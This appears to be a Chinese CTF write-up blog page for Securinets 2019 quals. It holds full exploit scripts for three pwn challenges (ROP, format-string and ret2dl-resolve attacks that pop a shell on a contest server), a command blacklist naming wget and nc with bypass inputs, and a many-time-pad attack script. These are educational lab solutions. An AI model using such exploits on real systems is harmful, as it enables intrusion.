(+0x17a86)| 0x000007ab 0fb64002 movzx eax, byte [rax + 2] ; [0x2:1]=76| ; DATA XREF from main (+0x17b4c)| 0x000007af 8845ff mov byte [local_1h], al| ; DATA XREF from main (+0x17bdd)| 0x000007b2 8075ffeb xor byte [local_1h], 0xeb| ; DATA XREF from main (+0x17ca3)| 0x000007b6 807dff8e cmp byte [local_1h], 0x8e| ; DATA XREF from main (+0x17d70)| 0x000007ba 7416 je 0x7d2... 往下看变得复杂了一些，将输入和0xeb异或了一下再与0x8e比较，故这里的字符是chr(0xeb^0x8e)=&#39;e&#39;。 事实证明，这道题用 Ghidra 很方便。这个文件的 main 函数非常大，ida 都没法反编译。Ghidra 可以快速地分析，然后我们通过 python 正则匹配一下就能得到 flag： 正则匹配： 12345678910#!/usr/bin/env pythonimport rewith open('bin.c', 'rb') as f: txt = f.read() regex = re.compile(r'\\'(.*)\\'') # print regex.findall(txt) output = '' for c in regex.findall(txt): output += c print output 输出 flag： 12$ ./solve.py | grep -E \"flag|securinets\"... here is you flag securinets&#123;automating_everything_is_the_new_future&#125; ... Warmup: Welcome to securinets CTF!12root@91120f278fdd:~/ctf/2019-Securinets/re/warmup# file warmupwarmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=93a17fbbf5e51001a87144a35c32ea813c43cbf4, stripped ltrace 一下，大概能看出做了什么： 123456789101112131415161718root@91120f278fdd:~/ctf/2019-Securinets# ltrace ./warmupputs(\"Welcome to securinets quals CTF \"...Welcome to securinets quals CTF :)) = 35printf(\"PASSCODE:\") = 9fgets(PASSCODE:ABC123\"ABC123\\n\", 100, 0x7f6912b8aa00) = 0x55e762c220e0strlen(\"ABC123\\n\") = 7...malloc(137) = 0x55e763504a80strlen(\"QUJDMTIzCgCA/gMAcP4AADhpAAABABBp\"...) = 136...strlen(\"QUJDMTIz\") = 8strlen(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef\"...) = 62...puts(\"NOPE :( \"NOPE :() = 9exit(0 &lt;no return ...&gt;+++ exited (status 0) +++ 放进 ida 里看看 main 函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int length; // eax _BOOL4 v4; // ebx int v5; // ebx int v6; // ebx int v7; // ebx int v8; // ebx int v9; // ebx int v10; // ebx int v11; // ebx int v12; // ebx int v13; // ebx int v14; // ebx int v15; // ebx int v16; // ebx int v17; // ebx int v18; // ebx int v19; // ebx int v20; // ebx int v21; // ebx int v22; // ebx int v23; // ebx int v24; // ebx int v25; // ebx int v26; // ebx int v27; // ebx int i; // [rsp+8h] [rbp-1C8h] int j; // [rsp+Ch] [rbp-1C4h] char *s; // [rsp+18h] [rbp-1B8h] int v32[102]; // [rsp+20h] [rbp-1B0h] unsigned __int64 v33; // [rsp+1B8h] [rbp-18h] v33 = __readfsqword(0x28u); puts(\"Welcome to securinets quals CTF :)\"); printf(\"PASSCODE:\", a2); fgets(passcode, 100, stdin); for ( i = 0; i &lt; strlen(passcode); ++i ) v32[i] = passcode[i]; length = sub_89A(0x64u); s = (char *)malloc(length + 1); base64_encode((__int64)v32, 0x64u, (__int64)s); for ( j = 0; j &lt; strlen(s) &amp;&amp; s[j] != 'C'; ++j ) base64_string[j] = s[j]; base64_string[strlen(base64_string)] = 0; v4 = sub_B88(base64_string); v5 = (unsigned __int64)sub_C07(base64_string) + v4; v6 = (unsigned __int64)sub_C68((__int64)base64_string) + v5; v7 = (unsigned __int64)sub_E25(base64_string) + v6; v8 = (unsigned __int64)sub_C90(base64_string) + v7; v9 = (unsigned __int64)sub_CAD(base64_string) + v8; v10 = (unsigned __int64)sub_CDA(base64_string) + v9; v11 = (unsigned __int64)sub_DA8(base64_string) + v10; v12 = (unsigned __int64)sub_DF4(base64_string) + v11; v13 = (unsigned __int64)sub_E6E(base64_string) + v12; v14 = (unsigned __int64)sub_ECA(base64_string) + v13; v15 = (unsigned __int64)sub_EF7(base64_string) + v14; v16 = (unsigned __int64)sub_F53(base64_string) + v15; v17 = (unsigned __int64)sub_FAF(base64_string) + v16; v18 = (unsigned __int64)sub_E51(s) + v17; v19 = (unsigned __int64)sub_107E(base64_string) + v18; v20 = (unsigned __int64)sub_10AF(base64_string) + v19; v21 = (unsigned __int64)sub_10E0(base64_string) + v20; v22 = (unsigned __int64)sub_10FD(base64_string) + v21; v23 = (unsigned __int64)sub_112A(base64_string) + v22; v24 = (unsigned __int64)sub_11FB(base64_string) + v23; v25 = (unsigned __int64)sub_1234(base64_string) + v24; v26 = (unsigned __int64)sub_1287(base64_string) + v25; v27 = (unsigned __int64)sub_12B6(base64_string) + v26; if ( v27 + (unsigned int)sub_1309(base64_string) == 25 ) &#123; puts(\"Good job! u know what to do and submit!\"); &#125; else &#123; puts(\"NOPE :(\"); free(s); &#125; return 0LL;&#125; 一开始做了一个 base64，然后一系列的没有规律的加密，我们所需要做的是耐心地倒退出来就行了。脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/env pythonimport base64def pos(x,y): for i in range(len(y)): if y[i] == x: return itable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'enc = [0] * 36enc[0] = ord(table[28])enc[3] = ord('j')enc[4] = enc[0] + 1enc[12] = enc[4] - 1enc[22] = enc[4] - 1enc[24] = enc[4] - 1enc[1] = ord(table[54])enc[2] = ord(table[((28 + pos(chr(enc[1]), table)) &gt;&gt; 2) + 1])enc[10] = enc[2]enc[6] = enc[3] - 32enc[7] = ord('p')enc[11] = 48enc[23] = 48enc[35] = enc[11] + 9enc[8] = enc[0] - 1enc[27] = enc[4] + 2enc[31] = enc[27]enc[9] = enc[27] + 7enc[25] = enc[27] + 7enc[13] = enc[1] + 1enc[17] = enc[1] + 1enc[21] = enc[1] + 1enc[15] = enc[7] + 3enc[14] = enc[15] + 1enc[19] = ord('z')enc[34] = enc[0] - 33enc[5] = 88enc[20] = 88enc[29] = 88enc[33] = 88enc[26] = 49enc[16] = enc[9] - 32enc[28] = enc[16]enc[18] = enc[7] - 30enc[30] = enc[18]enc[32] = enc[4]flag = ''for i in enc: flag += chr(i)flag = base64.b64decode(flag)print 'flag:', flag CryptoUseless Admin题目说明了是 OTP（一次一密），并且给了一个 json，里面有用同一个密钥加密的不同密文，以及同样被加密的 flag。 12345678910111213141516&#123; \"cipher_list\": [ \"1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940\", \"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f\", \"1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d\", \"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f\", \"1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c\", \"1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e\", \"1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347\", \"0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42\", \"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542\", \"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b\", \"1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40\" ], \"cipher_flag\": \"1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b\"&#125; 同时我找到了一篇2017 年 AlexCTF 中类似的 writeup，用的是 github 上的一个attack 脚本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = '1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940'c2 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f'c3 = '1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d'c4 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f'c5 = '1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c'c6 = '1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e'c7 = '1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347'c8 = '0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42'c9 = '160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542'c10 = '1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b'c11 = '1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40'ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to cracktarget_cipher = '1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b'# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return \"\".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])# To store the final keyfinal_key = [None]*300# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don't xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode('hex'),' '*300) for index in knownSpaceIndexes: # Store the key's value at the correct position final_key[index] = xor_with_spaces[index].encode('hex') # Record that we known the key at this position known_key_positions.add(index)# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)final_key_hex = ''.join([val if val is not None else '00' for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))print \"Fix this sentence:\"print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+\"\\n\"# WAIT.. MANUAL STEP HERE# This output are printing a * if that character is not known yet# fix the missing characters like this: \"Let*M**k*ow if *o&#123;*a\" = \"cure, Let Me know if you a\"# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good key#target_plaintext = \"cure, Let Me know if you a\"target_plaintext = \"i wanted to end the world, but i'll settle for ending yours.\"print \"Fixed:\"print target_plaintext+\"\\n\"key = strxor(target_cipher.decode('hex'),target_plaintext)print \"Decrypted msg:\"for cipher in ciphers: print strxor(cipher.decode('hex'),key)print \"\\nPrivate key recovered: \"+key+\"\\n\" 具体原理应该就是异或了，只需要想办法复原 key 即可。我还找到一个cli 工具，让还原 key 更简单，截图如下： PwnWelcome给了个 ssh，然后无法执行 welcome 以及查看 flag.txt： 1234567891011121314151617$ pwd/home/welcome$ whoamiwelcome$ ls -altotal 56dr-xr-xr-x 2 welcome welcome 4096 Mar 23 20:23 .drwxr-xr-x 22 root root 4096 Mar 24 10:18 ..-rw-r--r-- 1 root root 0 Mar 25 02:13 .bash_history-rw-r--r-- 1 welcome welcome 0 Mar 24 00:22 .bash_logout-rw-r--r-- 1 welcome welcome 1 Mar 24 13:33 .bashrc-rw-r--r-- 1 welcome welcome 655 May 16 2017 .profile-r-------- 1 welcome-cracked welcome-cracked 76 Mar 23 20:23 flag.txt-r--------+ 1 welcome-cracked welcome 8712 Mar 23 19:09 welcome-rw-r----- 1 root root 175 Mar 23 12:27 welcome.c-r-s--x--- 1 welcome-cracked welcome 13088 Mar 23 20:13 wrapper-rw-r--r-- 1 root root 1741 Mar 23 20:13 wrapper.c wrapper 是可以执行的，源码也能查看，可以大致看看做了什么： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/* author : Anis_Boss */#include &lt;stdio.h&gt;int search(char str[], char word[])&#123; int l, i, j; /*length of word */ for (l = 0; word[l] != '\\0'; l++); for (i = 0, j = 0; str[i] != '\\0' &amp;&amp; word[j] != '\\0'; i++) &#123; if (str[i] == word[j]) &#123; j++; &#125; else &#123; j = 0; &#125; &#125; if (j == l) &#123; /* substring found */ return (i - j); &#125; else &#123; return - 1; &#125;&#125;int delete_word(char str[], char word[], int index)&#123; int i, l; /* length of word */ for (l = 0; word[l] != '\\0'; l++); for (i = index; str[i] != '\\0'; i++) &#123; str[i] = str[i + l + 1]; &#125;&#125;void main(int argc, char* argv[])&#123;char * blacklist[]=&#123;\"cat\",\"head\",\"less\",\"more\",\"cp\",\"man\",\"scp\",\"xxd\",\"dd\",\"od\",\"python\",\"perl\",\"ruby\",\"tac\",\"rev\",\"xz\",\"tar\",\"zip\",\"gzip\",\"mv\",\"flag\",\"txt\",\"python\",\"perl\",\"vi\",\"vim\",\"nano\",\"pico\",\"awk\",\"grep\",\"egrep\",\"echo\",\"find\",\"exec\",\"eval\",\"regexp\",\"tail\",\"head\",\"less\",\"cut\",\"tr\",\"pg\",\"du\",\"`\",\"$\",\"(\",\")\",\"#\",\"bzip2\",\"cmp\",\"split\",\"paste\",\"diff\",\"fgrep\",\"gawk\",\"iconv\",\"ln\",\"most\",\"open\",\"print\",\"read\",\"&#123;\",\"&#125;\",\"sort\",\"uniq\",\"tee\",\"wget\",\"nc\",\"hexdump\",\"HOSTTYPE\",\"$\",\"arch\",\"env\",\"tmp\",\"dev\",\"shm\",\"lock\",\"run\",\"var\",\"snap\",\"nano\",\"read\",\"readlink\",\"zcat\",\"tailf\",\"zcmp\",\"zdiff\",\"zegrep\",\"zdiff\"&#125;; char str[80], word[50]; int index; printf(\"Welcome to Securinets Quals CTF \\o/ \\n\"); printf(\"Enter string:\\n\"); read(0,str,79);for (int i=0;i&lt;sizeof(blacklist)/sizeof(blacklist[0]);i++)&#123; index = search(str, blacklist[i]); if (index != - 1) &#123; delete_word(str, blacklist[i], index); &#125;&#125;setreuid(geteuid(),geteuid());close(0);system(str);&#125; 我们需要做的就是想办法绕过 blacklist，然后。基础绕过方式： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:catccat flagfflag.txtttxtsecurinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 进阶绕过方式，利用*通配： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:/bin/ca* fla*securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 高级绕过方式，sed 正则匹配： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:sed '' fla*securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; 官方给的 wp： 12345welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:/lib64/ld-linux-x86-64.so.2 ./welcomesecurinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125; Baby one1234567$ checksec ./baby1[*] &apos;/Users/qianfei/Desktop/baby1&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida 反编译出 main 函数： 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-30h] setvbuf(_bss_start, 0LL, 2, 0LL); write(1, \"Welcome to securinets Quals!\\n\", 0x1DuLL); return read(0, &amp;buf, 0x12CuLL);&#125; 简单的 rop，利用__libc_csu_init 来 call 函数，达到泄漏和 getshell。Exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./baby1')else: p = remote('51.254.114.246', 1111)elf = ELF('./baby1')read_plt = elf.plt['read']write_plt = elf.plt['write']read_got = elf.got['read']write_got = elf.got['write']main = elf.symbols['main']# gdb.attach(p)buf = 0x0602000-0x100# 4006a0: 4c 89 ea mov rdx,r13# 4006a3: 4c 89 f6 mov rsi,r14# 4006a6: 44 89 ff mov edi,r15d# 4006a9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4006ad: 48 83 c3 01 add rbx,0x1# 4006b1: 48 39 eb cmp rbx,rbp# 4006b4: 75 ea jne 4006a0 &lt;__libc_csu_init+0x40&gt;# 4006b6: 48 83 c4 08 add rsp,0x8# 4006ba: 5b pop rbx# 4006bb: 5d pop rbp# 4006bc: 41 5c pop r12# 4006be: 41 5d pop r13# 4006c0: 41 5e pop r14# 4006c2: 41 5f pop r15# 4006c4: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, addr): payload = '\\x00' * 56 + p64(0x4006ba) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x4006a0) + '\\x00' * 56 + p64(addr) p.sendline(payload)# payload = cyclic(500)offset = 56csu(0, 1, write_got, 8, write_got, 1, main)write = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00'))success('write = ' + hex(write))write_offset = 0x0f72b0libc_base = write - write_offsetsuccess('libc_base = ' + hex(libc_base))execve = libc_base + 0x0000000000cc770system = libc_base + 0x045390str_bin_sh = libc_base + 0x18cd57csu(0, 1, read_got, 16, buf, 0, main)p.send(p64(execve) + '/bin/sh\\x00')csu(0, 1, buf, 0, 0, buf + 8, main)p.interactive() Simple1234567root@91120f278fdd:~/ctf/2019-Securinets/pwn/Simple# checksec ./simple[*] '/root/ctf/2019-Securinets/pwn/Simple/simple' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida 反编译 main 函数： 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-50h] unsigned __int64 v5; // [rsp+48h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(_bss_start, 0LL, 2, 0LL); read(0, &amp;buf, 0x3FuLL); printf(&amp;buf, &amp;buf); perror(\"hemm okay\\n\"); return __readfsqword(0x28u) ^ v5;&#125; 在 printf 处可以看到格式化字符串漏洞，基本上这道题目就是多次利用了这个漏洞。第一次我们通过格式化字符串泄漏出 libc 的地址等相关信息，同时将 perror 的 got 表改成 main。第二次把 one_gadget 填到 ret 的地址上。第三次把 perror 的 got 表改回去，然后程序会直接 ret 到 one_gadget。Exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./simple') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') one_gadget_offset = 0x4f322else: p = remote('51.254.114.246', 4444) libc = ELF('libc.so.6') one_gadget_offset = 0x4526aelf = ELF('./simple')main = elf.symbols['main']perror_got = elf.got['perror']read_got = elf.got['read']payload = '%14$p%10$s%1682c%9$hn'payload += '\\x00' * (24 - len(payload))payload += p64(perror_got)payload += p64(read_got)p.send(payload)leak = p.recv()offset = 0xd8ret = int(leak[0:14], 16) - offsetread = u64(leak[14:20].ljust(8, '\\x00'))success('read = ' + hex(read))libc_base = read - libc.symbols['read']success('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget_offseta0 = one_gadget &amp; 0xffffa1 = ((one_gadget &amp; 0xffff0000) &gt;&gt; 16)a1 = (a1 - a0 - 1) % 0x10000 + 1payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(a0, 10)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(a1, 11)payload += '\\x00' * (32 - len(payload))payload += p64(ret)payload += p64(ret + 2)p.sendline(payload)payload = '%1430c%8$hn'payload += '\\x00' * (16 - len(payload))payload += p64(perror_got)p.sendline(payload)p.interactive() Baby Two1234567$ checksec ./baby2[*] '/Users/qianfei/ctf/ctf/2019-Securinets/pwn/Baby-Two/baby2' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida 反编译 main 函数： 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+8h] [ebp-30h] setvbuf(_bss_start, 0, 2, 0); return read(0, &amp;buf, 0x12Cu);&#125; 只有一个read，直接上ret2dl-resolve一把梭，以下是Yudai 大佬的 exp，用到了大佬写的库ptrlib： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#!/usr/bin/env python3from ptrlib import *import timeelf = ELF('./baby2')addr_plt = 0x08048320addr_start = elf.symbol('_start')addr_relplt = elf.section('.rel.plt')addr_dynsym = elf.section('.dynsym')addr_dynstr = elf.section('.dynstr')addr_bss = elf.section('.bss')rop_pop3 = 0x08048509rop_ret = 0x080482fafname = 'system\\x00'farg = '/bin/sh\\x00'plt_read = 0x08048330base_stage = addr_bss + 0x800addr_reloc = addr_bss + 0xa00addr_sym = addr_bss + 0xa80 | (addr_dynsym &amp; 0xF)addr_str = addr_bss + 8addr_arg = addr_str + len(fname)# Elf32_Relreloc = p32(elf.got('setvbuf'))reloc += p32((((addr_sym - addr_dynsym) // 0x10) &lt;&lt; 8) | 7)# Elf32_Symsym = p32(addr_str - addr_dynstr)sym += p32(0)sym += p32(0)sym += p32(0x12)def craft_read(addr, size): payload = p32(plt_read) payload += p32(rop_pop3) payload += p32(0) # fd payload += p32(addr) # buf payload += p32(size) # size return payload# ncat -vc ./baby2 -kl 8888sock = Socket('127.0.0.1', 8888)# sock = Socket('51.254.114.246', 2222)''' Stage 1 (probabilistic write) '''payload1 = b''payload1 += p32(rop_ret) * ((0x2c - 6 * 4) // 4)payload1 += craft_read(base_stage, 0x100) # 5 * 4payload1 += p32(addr_start) # 4payload1 += bytes([0x20])''' Stage 2 (stack pivot) '''payload2 = b'A' * 0x2cpayload2 += p32(base_stage + 4)payload2 += b'\\x00' * (0x12c - len(payload2))''' Stage 3 (craft) '''reloc_offset = addr_reloc - addr_relpltpayload3 = b''payload3 += craft_read(addr_reloc, 0x8)payload3 += craft_read(addr_sym, 0x10)payload3 += craft_read(addr_str, len(fname))payload3 += craft_read(addr_arg, len(farg))payload3 += p32(addr_plt)payload3 += p32(reloc_offset)payload3 += b'XXXX'payload3 += p32(addr_arg)payload3 += b'\\x00' * (0x100 - len(payload3))# Stage 1sock.send(payload1)time.sleep(0.5)sock.send(payload3)# Stage 2sock.send(payload2)# Stage 3sock.send(reloc)sock.send(sym)sock.send(fname)sock.send(farg)sock.interactive() WebFeedback这是一道XXE_Processing&gt;)，通过 burpsuite 抓包，然后直接利用网上的 exp看到： 然后同理，看到有 simple_user 这个用户，尝试看看能不能在家目录拿到 flag： 发现没有，再试试 apche 根目录： 还是不行。发现网站是 nginx 搭的，就 google 一下nginx 的默认 www 目录： 然后可以看到 root 的路径，尝试获得 flag： ForenEasy Trade用 wireshark 打开给的 pcap 包，总共只有几十条信息，可以一条条看下来。首先可以看到给出的 key： 然后再往下看可以找到一个 PK 头的 zip，看得到里面有flag.txt： 拿到flag.txt的内容后 base64 解密一下拿到 flag： 12345678910$ cat datasecurinetsXD$ unzip flag.zipArchive: flag.zip[flag.zip] flag.txt password: extracting: flag.txt$ cat flag.txt | base64 -Dsecurinets&#123;954f670cb291ec276b1a9ff8453ea60% MiscHIDDEN题目提示了在 url 栏中有些不一样的地方。可以看到这个网站用了 http 而不是 https： 点开后在证书中看到 flag： EZ图片隐写，在线解密一下： 123456789101112131415161718192021222324252627--START--&quot;The fact is that upon his entrance I had instantly recognized the extremepersonal danger in which I lay. The only conceivable escape for him lay in silencingmy tongue. In an instant I had slipped the revolver from the drawer into mypocket and was covering him through the cloth. At his remark I drew the weaponout and laid it cocked upon the table. He still smiled and blinked, but there wassomething about his eyes which made me feel very glad that I had it there,&quot;You evidently don&apos;t know me,&apos; said he.&quot;&apos;On the contrary,&apos; I answered, &apos;I think it is fairly evident that I do. Pray takea chair. I can spare you five minutes if you have anything to say.&apos;&quot;&apos;All that I have to say has already crossed your mind,&apos; said he.&quot;&apos;Then possibly my answer has crossed yours,&apos; I replied.&quot;&apos;You stand fast?&apos;&quot;&apos;Absolutely.&apos;&quot;He clapped his hand into his pocket, and I raised the pistol from the table.But he merely drew out a &lt;DETELED_WORD&gt; in which he had scribbled somedates.&quot;You crossed my path on the fourth of January,&apos; said he. &apos;On the twenty-thirdyou incommoded me; by the middle of February I was seriously inconveniencedby you; at the end of March I was absolutely hampered in my plans; and now, atthe close of April, I find myself placed in such a position through your continualpersecution that I am in positive danger of losing my liberty. The situation isbecoming an impossible one.&apos;&quot;&apos;Have you any suggestion to make?&apos; I asked.&quot;&apos;You must drop it, Mr. Holmes,&apos; said he, swaying his face about. &apos;You reallymust, you know.&apos;&quot;--END--; 可以看到有一个单词被删掉了，根据题目提示我们需要找到这个单词。google 之后发现是福尔摩斯的一个片段，找到单词之后，在线 sha1哈希一下得到 flag。 Referencehttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.behttps://ptr-yudai.hatenablog.com/entry/2019/03/25/152043https://www.rootnetsec.com/securinets-prequals-automateme/https://ctftime.org/writeup/14075","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"Buffer Overflow with gcc>=4.9","slug":"Buffer-Overflow-with-gcc-4-9","date":"2019-03-17T09:43:52.000Z","updated":"2019-08-26T05:54:45.733Z","comments":true,"path":"2019/03/17/Buffer-Overflow-with-gcc-4-9/","link":"","permalink":"blog.b3ale.cn/2019/03/17/Buffer-Overflow-with-gcc-4-9/","excerpt":"gcc 的版本如果大于 4.9，main 函数下的缓冲区溢出会有不一样的 check，即使没开 canary，也不能溢出。","text":"gcc 的版本如果大于 4.9，main 函数下的缓冲区溢出会有不一样的 check，即使没开 canary，也不能溢出。 Source自己写的一道题目，源码： 1234567891011121314// gcc p3.c -o p3 -m32 -static -fno-stack-protector -g#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() &#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); char buf[200]; printf(\"say something: \"); gets(buf); return 0;&#125; Analysis乍一看是静态编译，然后又是 gets，一定是很容易的栈溢出，但是大于 4.9 版本的 gcc 